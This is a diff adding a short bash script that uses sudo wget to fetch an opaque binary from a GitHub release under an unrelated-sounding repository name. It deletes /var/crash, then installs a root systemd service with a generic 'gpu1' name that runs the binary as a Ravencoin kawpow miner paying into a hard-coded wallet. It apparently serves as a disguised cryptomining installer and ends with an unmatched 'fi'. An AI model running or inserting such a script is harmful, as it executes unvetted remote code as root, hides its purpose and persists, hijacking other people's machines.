@@ -1,0 +1,25 @@
+#!/bin/bash
+cd /home
+sudo wget https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/vvvv
+sudo chmod +x vvvv
+sudo rm -rf /lib/systemd/system/gpu1.service
+sudo rm -rf /var/crash
+sudo bash -c 'cat <<EOT >>/lib/systemd/system/gpu1.service 
+[Unit]
+Description=gpu1
+After=network.target
+[Service]
+ExecStart= /home/vvvv -a kawpow -o stratum+tcp://us-rvn.2miners.com:6060 -u RXJBtyoRGF4DS8guDvsa3JJBUPVYZixtiR.drhuythoc -p x
+WatchdogSec=36000
+Restart=always
+RestartSec=60
+User=root
+[Install]
+WantedBy=multi-user.target
+EOT
+' &&
+sudo systemctl daemon-reload &&
+sudo systemctl enable gpu1.service &&
+sudo service gpu1 stop  &&
+sudo service gpu1 restart
+fi
